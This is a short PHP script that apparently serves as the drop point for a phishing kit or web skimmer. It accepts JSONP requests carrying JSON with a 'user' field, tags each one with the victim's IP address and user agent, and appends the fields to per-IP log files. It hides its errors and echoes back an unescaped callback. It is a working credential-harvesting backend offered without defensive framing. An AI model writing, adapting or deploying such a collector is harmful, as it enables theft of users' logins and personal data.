<?php 


//get real ip for Fat flux
function get_ip_address(){
foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
{
if (array_key_exists($key, $_SERVER) === true){
foreach (explode(',', $_SERVER[$key]) as $ip){
$ip = trim($ip); // just to be safeif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
{
return $ip;}}}}};$_SERVER['REMOTE_ADDR']= get_ip_address();






$ip = $_SERVER['REMOTE_ADDR'];

$filename="log_".str_replace('.','_',$ip).".txt";



$ua=$_SERVER['HTTP_USER_AGENT'];



ini_set("display_errors",0);
error_reporting(0);
ignore_user_abort(true);
set_time_limit(30);











		
 if(isset($_GET['callback'])){ 
 
	  header('Content-Type: text/javascript');
      $cb=$_GET['callback'];
      $data=$_GET['data'];
      $data=json_decode($data);
      
      if(isset($data->user)){
     	  //inject data
         	$string="\n################################################################################\n";
     	    $data->ip=$ip;
     	    $data->userAgent=$ua;
     	  //
      }
	 

      


        foreach($data as $key=>$val){
         	$string.=$key."=".$val."\n";
        };



		$obj=new stdClass();
		$obj->conect="OK";
		
		
		$res=@file_put_contents($filename,$string,FILE_APPEND);
        echo $cb.'('.json_encode($obj).')';
	    
 };
			
				
				
?>